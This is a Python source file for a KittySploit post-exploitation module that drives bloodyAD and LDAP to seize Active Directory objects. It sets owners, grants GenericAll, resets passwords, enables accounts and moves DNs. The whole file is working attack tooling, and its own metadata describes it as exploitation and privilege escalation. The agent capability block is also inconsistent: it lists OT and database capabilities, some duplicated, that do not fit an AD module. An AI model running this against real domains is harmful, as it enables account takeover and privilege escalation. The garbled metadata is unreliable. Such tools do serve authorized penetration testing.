#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import shlex
import shutil
import subprocess

from kittysploit import *

try:
    from ldap3 import ALL, Connection, Server
    LDAP3_AVAILABLE = True
except Exception:
    ALL = Connection = Server = None
    LDAP3_AVAILABLE = False


class Module(Post):
    __info__ = {
        "name": "AD Object ACL Operations",
        "description": "Runs common bloodyAD object/ACL operations: set owner, add GenericAll, move DN, set password, enable account.",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "tags": ["ad", "ldap", "acl", "bloodyad", "delegation", "post"],
        "references": ["https://github.com/CravateRouge/bloodyAD"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation', 'account_modification', 'privilege_escalation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    session_id = OptString("", "Session ID (unused; this module runs local AD/LDAP operations)", False, advanced=True)

    bloodyad_binary = OptString("bloodyAD", "bloodyAD executable name/path", True)
    action = OptChoice(
        "writable",
        "Operation: writable,set_owner,add_genericall,move_dn,set_password,enable_account,remove_uac",
        True,
        choices=["writable", "set_owner", "add_genericall", "move_dn", "set_password", "enable_account", "remove_uac"],
    )
    domain = OptString("example.local", "AD domain/FQDN", True)
    host = OptString("", "Domain controller host for --host", True)
    username = OptString("", "Authenticating username", True)
    password = OptString("", "Password; empty when using Kerberos ccache", False)
    kccache = OptString("", "Optional KRB5CCNAME ccache path", False)
    use_kerberos = OptBool(True, "Use Kerberos (-k)", False)
    use_ldaps = OptBool(True, "Use LDAPS (--use-ldaps) where supported", False)
    target_object = OptString("", "Target object DN/name for owner/ACL/password/UAC operations", False)
    principal = OptString("", "Principal to grant owner/GenericAll to", False)
    destination_dn = OptString("", "Destination DN for move_dn", False)
    new_password = OptString("", "New password for set_password", False)
    uac_flag = OptString("ACCOUNTDISABLE", "UAC flag for remove_uac/enable_account", False)
    dry_run = OptBool(False, "Only print the command that would run", False)
    timeout = OptInteger(120, "Command timeout in seconds", False, advanced=True)

    @staticmethod
    def _value(opt) -> str:
        return str(opt.value if hasattr(opt, "value") else opt or "")

    def _bloodyad(self) -> str:
        binary = self._value(self.bloodyad_binary).strip() or "bloodyAD"
        resolved = shutil.which(binary) if os.path.basename(binary) == binary else binary
        if not resolved:
            raise ProcedureError(FailureType.NotFound, f"{binary!r} not found in PATH")
        return resolved

    def _base_argv(self):
        argv = [
            self._bloodyad(),
            "--host",
            self._value(self.host).strip(),
            "-d",
            self._value(self.domain).strip(),
            "-u",
            self._value(self.username).strip(),
        ]
        if bool(self.use_kerberos):
            argv.append("-k")
        if self._value(self.password):
            argv.extend(["-p", self._value(self.password)])
        else:
            argv.extend(["-p", ""])
        if bool(self.use_ldaps):
            argv.append("--use-ldaps")
        return argv

    def _build_argv(self):
        action = self._value(self.action).strip()
        target = self._value(self.target_object).strip()
        principal = self._value(self.principal).strip()
        argv = self._base_argv()
        if action == "writable":
            return argv + ["get", "writable", "--detail"]
        if action == "set_owner":
            return argv + ["set", "owner", target, principal]
        if action == "add_genericall":
            return argv + ["add", "genericAll", target, principal]
        if action == "move_dn":
            raise ProcedureError(
                FailureType.ConfigurationError,
                "move_dn uses native LDAP ModifyDN; it is not a bloodyAD command",
            )
        if action == "set_password":
            return argv + ["set", "password", target, self._value(self.new_password)]
        if action in ("enable_account", "remove_uac"):
            return argv + ["remove", "uac", target, "-f", self._value(self.uac_flag).strip() or "ACCOUNTDISABLE"]
        raise ProcedureError(FailureType.ConfigurationError, f"Unsupported action: {action}")

    def _validate(self):
        action = self._value(self.action).strip()
        if action in ("set_owner", "add_genericall") and (not self._value(self.target_object).strip() or not self._value(self.principal).strip()):
            raise ProcedureError(FailureType.ConfigurationError, "target_object and principal are required")
        if action == "move_dn" and (not self._value(self.target_object).strip() or not self._value(self.destination_dn).strip()):
            raise ProcedureError(FailureType.ConfigurationError, "target_object and destination_dn are required")
        if action == "move_dn" and bool(self.use_kerberos):
            raise ProcedureError(FailureType.ConfigurationError, "move_dn currently requires password bind; set use_kerberos=false")
        if action == "set_password" and (not self._value(self.target_object).strip() or not self._value(self.new_password)):
            raise ProcedureError(FailureType.ConfigurationError, "target_object and new_password are required")
        if action in ("enable_account", "remove_uac") and not self._value(self.target_object).strip():
            raise ProcedureError(FailureType.ConfigurationError, "target_object is required")

    def _move_dn_ldap(self):
        if not LDAP3_AVAILABLE:
            raise ProcedureError(FailureType.NotFound, "ldap3 is required for move_dn")
        if not self._value(self.password):
            raise ProcedureError(FailureType.ConfigurationError, "password is required for move_dn LDAP bind")

        target = self._value(self.target_object).strip()
        destination = self._value(self.destination_dn).strip()
        if "," not in target:
            raise ProcedureError(FailureType.ConfigurationError, "target_object must be a full DN for move_dn")
        relative_dn = target.split(",", 1)[0]
        host = self._value(self.host).strip()
        user = self._value(self.username).strip()
        if "\\" not in user and "@" not in user and self._value(self.domain):
            user = f"{self._value(self.domain)}\\{user}"

        print_info(f"LDAP ModifyDN: {target} -> {relative_dn},{destination}")
        if bool(self.dry_run):
            print_warning("dry_run=true; LDAP ModifyDN was not executed")
            return True

        server = Server(host, port=636 if bool(self.use_ldaps) else 389, use_ssl=bool(self.use_ldaps), get_info=ALL)
        conn = Connection(server, user=user, password=self._value(self.password), auto_bind=True)
        ok = conn.modify_dn(target, relative_dn, delete_old_dn=True, new_superior=destination)
        if ok:
            print_success("LDAP ModifyDN completed")
            conn.unbind()
            return True
        print_error(str(conn.result))
        conn.unbind()
        return False

    def run(self):
        self._validate()
        if self._value(self.action).strip() == "move_dn":
            return self._move_dn_ldap()

        argv = self._build_argv()
        env = os.environ.copy()
        if self._value(self.kccache).strip():
            env["KRB5CCNAME"] = self._value(self.kccache).strip()

        printable = " ".join(shlex.quote(x) for x in argv)
        if env.get("KRB5CCNAME"):
            printable = f"KRB5CCNAME={shlex.quote(env['KRB5CCNAME'])} {printable}"
        print_info(printable)
        if bool(self.dry_run):
            print_warning("dry_run=true; command was not executed")
            return True

        try:
            proc = subprocess.run(
                argv,
                env=env,
                capture_output=True,
                text=True,
                timeout=max(int(self.timeout or 120), 1),
                check=False,
            )
        except subprocess.TimeoutExpired:
            print_error("bloodyAD command timed out")
            return False

        output = ((proc.stdout or "") + ("\n" + proc.stderr if proc.stderr else "")).strip()
        if output:
            print_info(output[:20000])
        if proc.returncode == 0:
            print_success("bloodyAD operation completed")
            return True
        print_error(f"bloodyAD exited with status {proc.returncode}")
        return False
